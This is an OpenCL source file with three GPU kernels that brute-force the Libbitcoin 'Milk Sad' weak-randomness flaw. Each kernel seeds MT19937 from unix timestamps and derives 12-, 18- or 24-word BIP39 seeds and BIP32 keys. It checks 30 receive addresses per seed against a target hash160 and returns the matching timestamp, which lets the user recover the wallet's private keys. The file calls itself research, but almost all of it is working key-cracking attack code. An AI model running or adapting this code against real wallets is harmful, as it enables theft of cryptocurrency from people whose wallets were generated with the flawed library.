// Libbitcoin "Milk Sad" Vulnerability - Multi-Path (30 addresses per seed)
// MT19937 seeded with unix timestamp (seconds)
// Checks m/purpose'/0'/0'/0/[0-29] - 30 receive addresses per timestamp
//
// Three entropy sizes supported:
//   milk_sad_crack_multi30      → 128-bit (12 words)
//   milk_sad_crack_multi30_192  → 192-bit (18 words)
//   milk_sad_crack_multi30_256  → 256-bit (24 words)  ← FIX: was missing

// ============================================================================
// 128-bit (12-word mnemonic) — original, unchanged
// ============================================================================
__kernel void milk_sad_crack_multi30(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid;

    uchar entropy[16] __attribute__((aligned(4)));
    mt19937_extract_msb_128(timestamp, entropy);

    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete(entropy, seed);

    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);

    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);

    extended_private_key_t account0_key;
    hardened_private_child_from_private(&coin_key, &account0_key, 0);

    extended_private_key_t external_key;
    normal_private_child_from_private(&account0_key, &external_key, 0);

    for (uint addr_idx = 0; addr_idx < 30; addr_idx++) {
        extended_private_key_t address_key;
        normal_private_child_from_private(&external_key, &address_key, addr_idx);

        extended_public_key_t address_pub;
        public_from_private(&address_key, &address_pub);

        uchar hash160[20];
        identifier_for_public_key(&address_pub, hash160);

        ulong h1 = 0, h2 = 0;
        uint h3 = 0;
        for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])    << (i*8);
        for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8])  << (i*8);
        for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i+16]) << (i*8);

        if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
            uint idx = atomic_inc(result_count);
            if (idx < 1024) {
                results[idx] = ((ulong)addr_idx << 32) | timestamp;
            }
        }
    }
}

// ============================================================================
// 192-bit (18-word mnemonic)
// ============================================================================
__kernel void milk_sad_crack_multi30_192(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid;

    uchar entropy[24] __attribute__((aligned(4)));
    mt19937_extract_msb_192(timestamp, entropy);

    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete_24(entropy, seed);

    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);

    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);

    extended_private_key_t account0_key;
    hardened_private_child_from_private(&coin_key, &account0_key, 0);

    extended_private_key_t external_key;
    normal_private_child_from_private(&account0_key, &external_key, 0);

    for (uint addr_idx = 0; addr_idx < 30; addr_idx++) {
        extended_private_key_t address_key;
        normal_private_child_from_private(&external_key, &address_key, addr_idx);

        extended_public_key_t address_pub;
        public_from_private(&address_key, &address_pub);

        uchar hash160[20];
        identifier_for_public_key(&address_pub, hash160);

        ulong h1 = 0, h2 = 0;
        uint h3 = 0;
        for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])    << (i*8);
        for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8])  << (i*8);
        for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i+16]) << (i*8);

        if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
            uint idx = atomic_inc(result_count);
            if (idx < 1024) {
                results[idx] = ((ulong)addr_idx << 32) | timestamp;
            }
        }
    }
}

// ============================================================================
// 256-bit (24-word mnemonic) — Research Update #13
// ============================================================================
__kernel void milk_sad_crack_multi30_256(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid;

    // 32 bytes = 32 MT19937 outputs, one MSB each
    uchar entropy[32] __attribute__((aligned(4)));
    mt19937_extract_msb_256(timestamp, entropy);

    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete_32(entropy, seed);

    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);

    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);

    extended_private_key_t account0_key;
    hardened_private_child_from_private(&coin_key, &account0_key, 0);

    extended_private_key_t external_key;
    normal_private_child_from_private(&account0_key, &external_key, 0);

    // Check 30 receive addresses: m/purpose'/0'/0'/0/[0-29]
    for (uint addr_idx = 0; addr_idx < 30; addr_idx++) {
        extended_private_key_t address_key;
        normal_private_child_from_private(&external_key, &address_key, addr_idx);

        extended_public_key_t address_pub;
        public_from_private(&address_key, &address_pub);

        uchar hash160[20];

        // P2SH-P2WPKH (BIP49, purpose=49): Hash160 is computed over the
        // witness script, NOT the pubkey directly. This is critical for Update #13.
        if (purpose == 49) {
            uchar pubkey_hash[20];
            identifier_for_public_key(&address_pub, pubkey_hash);

            // witness_script = OP_0 (0x00) + PUSH20 (0x14) + pubkey_hash
            uchar witness_script[22];
            witness_script[0] = 0x00;  // OP_0
            witness_script[1] = 0x14;  // PUSH 20 bytes
            for (int i = 0; i < 20; i++) witness_script[i + 2] = pubkey_hash[i];

            uchar sha256_result[32] __attribute__((aligned(4)));
            sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
            ripemd160(sha256_result, 32, (__private uchar*)hash160);
        } else {
            // P2PKH (44) and P2WPKH (84): Hash160(pubkey) directly
            identifier_for_public_key(&address_pub, hash160);
        }

        ulong h1 = 0, h2 = 0;
        uint h3 = 0;
        for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])    << (i*8);
        for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8])  << (i*8);
        for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i+16]) << (i*8);

        if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
            uint idx = atomic_inc(result_count);
            if (idx < 1024) {
                results[idx] = ((ulong)addr_idx << 32) | timestamp;
            }
        }
    }
}
